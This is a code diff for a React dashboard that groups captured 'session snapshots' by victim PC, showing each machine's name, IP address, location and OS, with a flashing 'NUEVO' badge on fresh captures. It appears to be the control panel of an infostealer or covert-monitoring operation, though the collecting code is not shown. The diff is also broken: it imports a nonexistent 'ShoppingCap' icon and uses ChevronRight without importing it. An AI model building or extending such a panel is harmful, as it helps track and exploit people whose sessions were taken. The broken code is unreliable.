@@ -3,18 +3,23 @@
 import React, { useEffect, useState } from "react";
 import GlassCard from "@/components/GlassCard";
 import { 
-  Database, Users, Shield, Clock, ExternalLink, Facebook, Instagram, Twitter, MessageSquare, Play, Mail, Bot, Globe, AlertCircle, ShoppingCart, GraduationCap, Laptop, Cpu, Monitor, MapPin, Trash2, Smartphone
+  Database, Users, Shield, Clock, ExternalLink, Facebook, Instagram, Twitter, MessageSquare, Play, Mail, Bot, Globe, AlertCircle, ShoppingCap, Monitor, MapPin, Trash2, Smartphone, Zap
 } from "lucide-react";
 import Link from "next/link";
 import { supabase, SessionSnapshot } from "@/lib/supabase";
+
+const isNew = (date: string) => {
+  const diff = Date.now() - new Date(date).getTime();
+  return diff < 15 * 60 * 1000; // 15 minutos
+};
 
 const formatRelativeTime = (date: string) => {
   const now = new Date();
   const captured = new Date(date);
   const diffInSeconds = Math.floor((now.getTime() - captured.getTime()) / 1000);
-  if (diffInSeconds < 60) return "just now";
-  if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)}m ago`;
-  if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)}h ago`;
+  if (diffInSeconds < 60) return "ahora mismo";
+  if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)}m`;
+  if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)}h`;
   return captured.toLocaleDateString();
 };
 
@@ -45,7 +50,6 @@ export default function Home() {
 
       if (!allSnapshots) return;
 
-      // Group by Device
       const grouped: Record<string, any[]> = {};
       allSnapshots.forEach(s => {
         const dId = s.device_id || "unknown-node";
@@ -63,7 +67,8 @@ export default function Home() {
           ip: latest.ip_address || "0.0.0.0",
           location: latest.location_city ? `${latest.location_city}, ${latest.location_country || ""}` : "Remote",
           lastSeen: latest.captured_at,
-          count: devSess.length
+          count: devSess.length,
+          hasNew: devSess.some(s => isNew(s.captured_at))
         };
       });
 
@@ -109,11 +114,11 @@ export default function Home() {
         }
       }
       
-      alert("✅ Base de datos vaciada con éxito sin errores de timeout.");
+      alert("✅ Base de datos vaciada con éxito.");
       setDeleteProgress("");
       fetchDashboardData();
     } catch (err: any) {
-      alert("❌ Error: " + (err.message || "Timeout persistente"));
+      alert("❌ Error: " + (err.message || "Timeout"));
       setDeleteProgress("");
     } finally {
       setLoading(false);
@@ -142,7 +147,7 @@ export default function Home() {
       </div>
 
       <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
-        <GlassCard delay={0.4} className="lg:col-span-2 p-0 overflow-hidden">
+        <GlassCard delay={0.4} className="lg:col-span-2 p-0 overflow-hidden relative">
           <div className="p-8 border-b border-white/5 bg-white/[0.02] flex items-center justify-between">
             <h3 className="text-sm font-black uppercase tracking-[0.3em] text-white/40">Active Intel Nodes (By PC)</h3>
             <div className="flex items-center gap-2 text-[10px] font-black text-blue-400 bg-blue-400/10 px-3 py-1.5 rounded-full border border-blue-400/20 shadow-sm">
@@ -157,14 +162,18 @@ export default function Home() {
                 <Link 
                   key={device.id} 
                   href={`/device/${device.id}`}
-                  className="flex items-center justify-between p-7 hover:bg-white/[0.03] transition-all group border-l-4 border-transparent hover:border-blue-500"
+                  className="flex items-center justify-between p-7 hover:bg-white/[0.03] transition-all group border-l-4 border-transparent hover:border-blue-500 relative"
                 >
                   <div className="flex items-center gap-6">
-                    <div className="w-12 h-12 rounded-2xl bg-blue-500/10 flex items-center justify-center text-blue-400 shadow-inner group-hover:scale-110 transition-transform">
+                    <div className="w-12 h-12 rounded-2xl bg-blue-500/10 flex items-center justify-center text-blue-400 shadow-inner group-hover:scale-110 transition-transform relative">
                       <Monitor size={20} />
+                      {device.hasNew && <div className="absolute -top-1 -right-1 w-3 h-3 bg-emerald-500 rounded-full animate-ping" />}
                     </div>
                     <div>
-                      <p className="font-black text-white/90 text-lg uppercase tracking-wider">{device.pc_name}</p>
+                      <div className="flex items-center gap-3">
+                        <p className="font-black text-white/90 text-lg uppercase tracking-wider">{device.pc_name}</p>
+                        {device.hasNew && <span className="text-[8px] font-black bg-emerald-500 text-white px-2 py-0.5 rounded-full shadow-lg shadow-emerald-500/20">NUEVO</span>}
+                      </div>
                       <p className="text-xs text-gray-500 font-bold uppercase tracking-wider flex items-center gap-2">
                         <MapPin size={12}/> {device.location} | <span className="text-blue-400/60">{device.ip}</span>
                       </p>
@@ -173,9 +182,9 @@ export default function Home() {
                   <div className="flex items-center gap-6">
                     <div className="text-right">
                       <p className="text-[10px] font-black text-gray-600 uppercase tracking-widest">{device.os}</p>
-                      <p className="text-[9px] font-bold text-gray-700">{formatRelativeTime(device.lastSeen)}</p>
+                      <p className="text-[9px] font-bold text-blue-400 uppercase tracking-widest">{formatRelativeTime(device.lastSeen)} ago</p>
                     </div>
-                    <ExternalLink size={18} className="text-gray-700 group-hover:text-blue-400 transition-colors" />
+                    <ChevronRight size={18} className="text-gray-700 group-hover:text-blue-400 transition-transform group-hover:translate-x-1" />
                   </div>
                 </Link>
               ))
@@ -205,23 +214,20 @@ export default function Home() {
           </GlassCard>
 
           <GlassCard delay={0.6} className="p-8">
-            <h3 className="text-[11px] font-black uppercase tracking-[0.25em] text-white/30 mb-6">Nexus Health</h3>
+            <h3 className="text-[11px] font-black uppercase tracking-[0.25em] text-white/30 mb-6 flex items-center justify-between">Intel Status <Zap size={14} className="text-emerald-500 animate-pulse"/></h3>
             <div className="space-y-6">
               <div className="flex items-center justify-between text-[11px] font-black tracking-widest">
-                <span className="text-gray-500 uppercase">Local Grid Status</span>
+                <span className="text-gray-500 uppercase">Live Transmission</span>
                 <span className="text-emerald-400 flex items-center gap-2">
                   <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse shadow-[0_0_8px_rgba(52,211,153,0.5)]" />
-                  CONNECTED
+                  ACTIVE
                 </span>
               </div>
-              <div className="space-y-3">
-                <div className="flex items-center justify-between text-[11px] font-black tracking-widest">
-                  <span className="text-gray-500 uppercase">Storage Bandwidth</span>
-                  <span className="text-white/80">68% DEPLETED</span>
-                </div>
-                <div className="w-full bg-black/40 rounded-full h-2 overflow-hidden border border-white/5 shadow-inner">
-                  <div className="bg-gradient-to-r from-blue-600 to-indigo-600 h-full w-[68%] rounded-full shadow-[0_0_15px_rgba(37,99,235,0.4)]" />
-                </div>
+              <div className="p-4 bg-white/[0.02] border border-white/5 rounded-2xl">
+                 <p className="text-[9px] font-black text-gray-500 uppercase mb-2">Network Load</p>
+                 <div className="w-full bg-black/40 rounded-full h-1.5 overflow-hidden">
+                    <div className="bg-blue-500 h-full w-[12%] rounded-full animate-pulse" />
+                 </div>
               </div>
             </div>
           </GlassCard>
